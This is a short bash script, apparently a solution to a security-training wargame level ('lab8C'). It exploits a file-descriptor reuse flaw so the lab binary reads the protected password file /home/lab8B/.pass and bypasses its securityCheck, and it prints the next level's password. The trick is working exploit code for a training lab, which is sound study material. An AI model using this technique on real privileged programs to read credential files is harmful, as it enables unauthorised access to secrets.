#!/bin/bash
# Exploit for level lab8C


# Exploitation: First, pass the file containing the flag. Then the file a file
# descriptor (3). When the program opens the flag file, we assume that it will
# be given the first available file descriptor (3). Then, when the program
# reads from that file descriptor, it will be reading from the password file
# and will bypass securityCheck.

flagfile="/home/lab8B/.pass"
echo "flag : "$(/levels/lab08/lab8C -fn=$flagfile -fd=3 | cut -d"\"" -f4)
